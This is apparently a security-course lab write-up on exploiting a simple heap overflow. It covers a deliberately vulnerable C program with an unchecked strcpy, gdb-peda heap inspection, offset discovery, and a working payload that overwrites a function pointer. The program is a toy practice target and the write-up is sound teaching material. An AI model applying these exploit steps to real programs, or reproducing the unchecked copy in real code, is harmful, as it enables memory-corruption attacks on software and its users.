### 6. Simple Heap Overflow

Data structures are stored on the heap. In this example, because there is a function pointer in the data structure, the exploit is analogous to controlling EIP in a stack overflow.

##### Getting the program
```
curl https://samsclass.info/127/proj/heap0.c > heap0.c
gcc heap0.c -w -g -no-pie -z execstack -o heap0
```

##### Source code
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
 char name[64];
};

struct fp {
 int (*fp)();
};

void winner() {
 printf("level passed\n");
}

void nowinner() {
 printf("level has not been passed\n");
}

int main(int argc, char **argv) {
 struct data *d;
 struct fp *f;

 d = malloc(sizeof(struct data));
 f = malloc(sizeof(struct fp));
 f->fp = nowinner;
 strcpy(d->name, argv[1]);
 f->fp();
}
```

On line 30, the command line argument is copied into the heap without checking the bounds. It's possible to overflow the heap and change the function pointer to the winner() function.

##### Verify the vulnerability

If we overflow the function pointer, the program will crash at line 37 when it tries to call the function it's pointing to.

```
alias p7heap="env - PWD=$PWD /full/path/to/heap0"

$ p7heap hello
level has not been passed

$ p7heap $(python -c "print 'A' * 100")
Segmentation fault (core dumped)
```

##### Exploring the heap

```
env - gdb
source ~/.gdbinit
file heap0
```

We set a breakpoint right before the function is called on line 31, and run the program.
```
list 25, 40
break 38
run AAAA
```

We can use the command
```
info proc map
```
To look at the memory layout of the program.
We can see the heap is at address 0x804000.
```
gdb-peda$ info proc map
process 6616
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x804b000  0x806d000    0x22000        0x0 [heap]
```

If we examine the memory of the heap, we can see our input as well as an address a bit further down.

```
gdb-peda$ x/120xw 0x804b000         
. . .
0x804b150:      0x00000000      0x00000000      0x00000000      0x00000051
0x804b160:      0x41414141      0x00000000      0x00000000      0x00000000
0x804b170:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b180:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b190:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b1a0:      0x00000000      0x00000000      0x00000000      0x00000011
0x804b1b0:      0x080484e1      0x00000000      0x00000000      0x00000411
. . .
```

If we disassemble the nowinner function, we can see that the address stored in the heap is the same. This is the location of our function pointer data.

```
gdb-peda$ disas nowinner              
Dump of assembler code for function nowinner:
   0x080484e1 <+0>:     push   ebp
   . . .
```

##### Overwriting the function pointer

We can use the pattern tool inside gdb-peda to find where EIP is getting overwritten in our input.

```
gdb-peda$ pattern arg 100
gdb-peda$ run
gdb-peda$ continue
```

We get a segmentation fault when the program tries to go to address 0x41414a41 ('AJAA'). If we check the heap, we can see that the data has been overwritten.

```
x/120xw 0x804b000
. . . 
0x804b160:      0x25414141      0x41734141      0x41414241      0x6e414124
0x804b170:      0x41434141      0x41412d41      0x44414128      0x413b4141
0x804b180:      0x41412941      0x61414145      0x41304141      0x41414641
0x804b190:      0x31414162      0x41474141      0x41416341      0x48414132
0x804b1a0:      0x41644141      0x41413341      0x65414149      0x41344141
0x804b1b0:      0x41414a41      0x35414166      0x414b4141      0x41416741
. . .
```

Let's find the offset

```
gdb-peda$ pattern search            
Registers contain pattern buffer:
EAX+0 found at offset: 80
EIP+0 found at offset: 80
```

##### Putting it all together

The last thing we need is the address of the winner function. That will be what we overwrite the function pointer in the heap with.

```
gdb-peda$ disas winner
Dump of assembler code for function winner:
   0x080484b6 <+0>:     push   ebp
```

Now we have everything we need for our exploit.

```
$ p7heap $(python -c "print 'A' * 80 + '\xb6\x84\x04\x08'")
level passed
```

Or in a python script

```
#!/usr/bin/python
# exploit.py

import struct

win_address = 0x080484b6
payload = "A" * 80 + struct.pack("I", win_address)
print payload
```
